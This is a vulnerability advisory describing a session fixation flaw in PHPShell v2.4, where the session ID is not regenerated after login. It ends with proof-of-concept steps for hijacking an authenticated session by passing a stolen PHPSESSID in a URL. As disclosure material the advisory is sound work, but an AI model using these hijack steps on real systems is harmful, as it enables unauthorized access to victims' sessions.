Product:
==============
PHPShell v2.4



Vulnerability Type:
===================
Session Fixation



CVE Reference:
==============
N/A



Security Issue:
================
PHPShell does not regenerate the Session ID upon authentication, this can
potentially allow remote attackers to access parts of the application
using only a valid PHPSESSID if PHP.INI setting for
session.use_only_cookies=0.

Since an existing XSS vulnerability exists in PHPShell "
http://hyp3rlinx.altervista.org/advisories/PHPSHELL-v2.4-CROSS-SITE-SCRIPTING.txt"
the risk is
increased if an authenticated user clicks an attacker supplied link and the
attacker finds way to access or set the victims Cookie.

In &#039;phpshell.php&#039; line 153 we see call to PHP function session_start();

After user authentication no call to "session_regenerate_id()" is made
However, "session.use_only_cookies=1" is default since PHP 4.3.0, so to
exploit it would require that PHP.INI is set to session.use_only_cookies=0
on the victims system.

When accessing the application using the session fixation flaw and
attempting to run system command the application luckily redirects to login
form.
However, if a victim is actively changing directorys, reading files etc...
attackers may still be able to read current directory and files open
in the victims PHPShell console window.



Exploit/POC:
=============

1) Login to PHPShell run commands to CD to Windows directory and run DIR
command etc, then find and copy the PHPSESSID Cookie

2) Open a second browser (InternetExplorer) and access the application
cleanly for first time using the PHPSESSID in URL.

e.g.

http://VICTIM-IP/phpshell-2.4/phpshell.php?PHPSESSID=<STOLEN-SESSION-ID>

You should see what the authenticated victim now sees...
